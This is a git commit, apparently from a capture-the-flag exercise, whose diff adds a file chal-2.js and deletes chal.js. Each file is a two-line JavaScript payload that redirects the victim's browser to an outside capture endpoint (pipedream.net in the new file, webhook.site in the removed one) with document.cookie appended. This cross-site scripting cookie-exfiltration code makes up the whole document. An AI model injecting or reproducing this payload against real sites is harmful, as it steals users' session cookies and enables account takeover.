16c545df274e7e506f438eaf382322b7a322d147
Krishnan Navadia <krishnannavadia@gmail.com>
2023-09-19 15:00:35 -0400

    updated

---
+++ chal-2.js
@@ -0,0 +1,2 @@
+document.location =
+  "https://eouqmxuszy70dk7.m.pipedream.net/?cookie=" + document.cookie;
--- chal.js
+++
@@ -1,3 +0,0 @@
-document.location =
-  "https://webhook.site/3df9ef8e-7abe-497c-92ae-85ba9ad8d783/?cookie=" +
-  document.cookie;
